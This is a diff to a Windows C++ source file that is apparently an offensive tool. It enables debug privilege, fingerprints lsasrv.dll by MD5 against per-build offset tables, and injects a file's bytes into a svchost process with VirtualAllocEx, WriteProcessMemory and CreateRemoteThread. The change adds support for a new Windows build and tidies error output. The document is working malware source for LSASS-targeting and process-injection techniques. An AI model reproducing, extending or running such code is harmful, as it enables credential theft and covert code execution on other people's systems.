@@ -7,32 +7,36 @@
 #include <tlhelp32.h>
 #include <psapi.h>
 #include <userenv.h>
-#include <iostream>
 #include <windows.h>
-#include <wincrypt.h>
-#include <iostream>
-#include <iomanip>
-#include <string>
+#include <wincrypt.h>   
 char _final_md5_hash[33];
-bool CalculateMD5(const std::wstring& filePath, std::wstring& md5Hash) {
-	HANDLE hFile = CreateFile(filePath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+DWORD myfuckingpow(int a,int b) {
+	int sum = 1;
+	for (int i = 0; i < b; i++) {
+		sum = a * sum;
+	}
+	if (b == 0)return 1;
+	return sum;
+}
+bool CalculateMD5(char* filePath) {
+	HANDLE hFile = CreateFileA(filePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 
 	if (hFile == INVALID_HANDLE_VALUE) {
-		std::cerr << "Error opening file: " << GetLastError() << std::endl;
+		//	、、std::cerr << "Error opening file: " << (unsigned int)GetLastError() << std::endl;
 		return false;
 	}
 
 
 	HCRYPTPROV hProv;
 	if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
-		std::cerr << "CryptAcquireContext failed: " << GetLastError() << std::endl;
+		//std::cerr << "CryptAcquireContext failed: " << (unsigned int)GetLastError() << std::endl;
 		CloseHandle(hFile);
 		return false;
 	}
 
 	HCRYPTHASH hHash;
 	if (!CryptCreateHash(hProv, CALG_MD5, 0, 0, &hHash)) {
-		std::cerr << "CryptCreateHash failed: " << GetLastError() << std::endl;
+		///std::cerr << "CryptCreateHash failed: " << (unsigned int)GetLastError() << std::endl;
 		CryptReleaseContext(hProv, 0);
 		CloseHandle(hFile);
 		return false;
@@ -44,7 +48,7 @@ bool CalculateMD5(const std::wstring& filePath, std::wstring& md5Hash) {
 
 	while (ReadFile(hFile, buffer, bufferSize, &bytesRead, NULL) && bytesRead > 0) {
 		if (!CryptHashData(hHash, buffer, bytesRead, 0)) {
-			std::cerr << "CryptHashData failed: " << GetLastError() << std::endl;
+			//	std::cerr << "CryptHashData failed: " << (unsigned int)GetLastError() << std::endl;
 			CryptDestroyHash(hHash);
 			CryptReleaseContext(hProv, 0);
 			CloseHandle(hFile);
@@ -55,7 +59,7 @@ bool CalculateMD5(const std::wstring& filePath, std::wstring& md5Hash) {
 	BYTE hash[16];
 	DWORD hashSize = 16;
 	if (!CryptGetHashParam(hHash, HP_HASHVAL, hash, &hashSize, 0)) {
-		std::cerr << "CryptGetHashParam failed: " << GetLastError() << std::endl;
+		//std::cerr << "CryptGetHashParam failed: " << (unsigned int)GetLastError() << std::endl;
 		CryptDestroyHash(hHash);
 		CryptReleaseContext(hProv, 0);
 		CloseHandle(hFile);
@@ -79,9 +83,9 @@ bool CalculateMD5(const std::wstring& filePath, std::wstring& md5Hash) {
 }
 
 int mainMD5() {
-	std::wstring filePath = L"C:\\windows\\system32\\lsasrv.dll";
-	std::wstring md5Hash;
-	return CalculateMD5(filePath, md5Hash);
+	char filePath[100] = "C:\\windows\\system32\\lsasrv.dll";
+
+	return CalculateMD5(filePath);
 }
 #define TABLE_LENGTH 1024
 bool EnableDebugPrivilege()
@@ -92,13 +96,13 @@ bool EnableDebugPrivilege()
 
 	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &tokenHandle))
 	{
-		std::cout << "Failed to open process token. Error: " << GetLastError() << std::endl;
+		//std::cout << "Failed to open process token. Error: " << (unsigned int)GetLastError() << std::endl;
 		return false;
 	}
 
 	if (!LookupPrivilegeValue(nullptr, SE_DEBUG_NAME, &luid))
 	{
-		std::cout << "Failed to lookup privilege value. Error: " << GetLastError() << std::endl;
+		//std::cout << "Failed to lookup privilege value. Error: " << (unsigned int)GetLastError() << std::endl;
 		CloseHandle(tokenHandle);
 		return false;
 	}
@@ -109,7 +113,7 @@ bool EnableDebugPrivilege()
 
 	if (!AdjustTokenPrivileges(tokenHandle, FALSE, &tokenPrivileges, sizeof(TOKEN_PRIVILEGES), nullptr, nullptr))
 	{
-		std::cout << "Failed to adjust token privileges. Error: " << GetLastError() << std::endl;
+		//std::cout << "Failed to adjust token privileges. Error: " << (unsigned int)GetLastError() << std::endl;
 		CloseHandle(tokenHandle);
 		return false;
 	}
@@ -136,7 +140,8 @@ char version_table[TABLE_LENGTH][50] = {
 	"6.1.7601.26561",
 	"10.0.16299.431",
 	"10.0.19041.3324",
-	"10.0.17763.4377"
+	"10.0.17763.4377",
+	"10.0.19041.3570"
 };
 char _md5_table[TABLE_LENGTH][33] = {
 	"e862003aea8c3463f72d7225d1dfbcf0", // 10.0.19041.1
@@ -152,7 +157,8 @@ char _md5_table[TABLE_LENGTH][33] = {
 	"10.0.16299.431",
 	"f17409ddc9a794eb39cfcd21d2c84c6f", // 10.0.19041.3324
 	"6548b134a3cf304b91490fe916d934b5", // 10.0.17763.4377
-	"951a238e964be37f74c32564d2a92319" // 10.0.17763.4377
+	"951a238e964be37f74c32564d2a92319", // 10.0.17763.4377
+	"dd8cacce0209e5f7c4c31720e24178f0" // 10.0.19041.3570
 
 };
 DWORD offset_table[TABLE_LENGTH] = {
@@ -176,7 +182,8 @@ DWORD _offset_table[TABLE_LENGTH][5] = {
 	  {0x915C,0x3E328,0x3E34D,0xE8,0x38},
 	{0x1FA63,0x395DC,0x8CA6C,0xe8,0x38}, // 10.0.19041.3324
 	{0x37DEC,0x320FC,0x321C8,0xe8,0x38} , // 6548b134a3cf304b91490fe916d934b5
-	{0x374DC,0x31E3C,0x31F08,0xe8,0x38}  // 951a238e964be37f74c32564d2a92319
+	{0x374DC,0x31E3C,0x31F08,0xe8,0x38},  // 951a238e964be37f74c32564d2a92319
+	{0x39323,0x3016C,0x86FD4,0xe8,0x38} // dd8cacce0209e5f7c4c31720e24178f0
 };
 void getosversion(char* result) {
 	char buffer[1024] = { 0 };
@@ -319,7 +326,7 @@ int _EntryCode1()
 	int finalnumber = 0;
 	int oi = 0;
 	for (int i = 0; i < maxpowenum; i++) {
-		int temp = (readlyversionnumber[oi++] - '0') * pow(10, maxpowenum - i);
+		int temp = (readlyversionnumber[oi++] - '0') * myfuckingpow(10, maxpowenum - i);
 		finalnumber += temp;
 	}
 	finalnumber = finalnumber + readlyversionnumber[strlen(readlyversionnumber) - 1] - '0';
@@ -348,7 +355,7 @@ int _EntryCode1()
 	// 我们把lsasrv.dll自己加载上来看一下ntheader就行了
 	// 这个dll无法加载lsasrv这个dll，直接读取文件头算了
 	//unsigned char* lsasrvLocal = (unsigned char*)LoadLibraryA("C:\\windows\\system32\\lsasrv.dll");
-	//DWORD error = GetLastError();
+	//DWORD error = (unsigned int)GetLastError();
 	//if (lsasrvLocal == (unsigned char*)0) {
 	//	//printf("[x] load module failed, abort...\n");
 
@@ -487,14 +494,14 @@ int _EntryCode1()
 	);
 
 	if (hFile == INVALID_HANDLE_VALUE) {
-		printf("Error opening the file, error code : %x\n",GetLastError());
+		printf("Error opening the file, error code : %x\n", (unsigned int)GetLastError());
 		return 1;
 	}
 
 	// Get the file size
 	DWORD fileSize = GetFileSize(hFile, NULL);
 	if (fileSize == INVALID_FILE_SIZE) {
-		printf( "Error getting file size\n");
+		printf("Error getting file size\n");
 		CloseHandle(hFile);
 		return 1;
 	}
@@ -534,7 +541,7 @@ int _EntryCode1()
 	HANDLE hw = OpenProcess(PROCESS_ALL_ACCESS, 0, _svchost_1_pid);
 	if (!hw)
 	{
-		printf("Process Not found (0x%lX)\n", GetLastError());
+		printf("Process Not found (0x%x)\n", (unsigned int)GetLastError());
 		return -1;
 	}
 	void* base = VirtualAllocEx(hw, NULL, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
@@ -545,14 +552,14 @@ int _EntryCode1()
 	}
 	if (!WriteProcessMemory(hw, base, byteArray, fileSize, NULL))
 	{
-		printf("write process memory faild (0x%lX)\n", GetLastError());
+		printf("write process memory faild (0x%x)\n", (unsigned int)GetLastError());
 		CloseHandle(hw);
 		return -1;
 	}
 	HANDLE thread = CreateRemoteThread(hw, NULL, NULL, (LPTHREAD_START_ROUTINE)base, NULL, 0, 0);
 	if (!thread)
 	{
-		printf("Failed to create thread (0x%lX)\n", GetLastError());
+		printf("Failed to create thread (0x%x)\n", (unsigned int)GetLastError()	 );
 		CloseHandle(hw);
 		CloseHandle(thread);
 	}
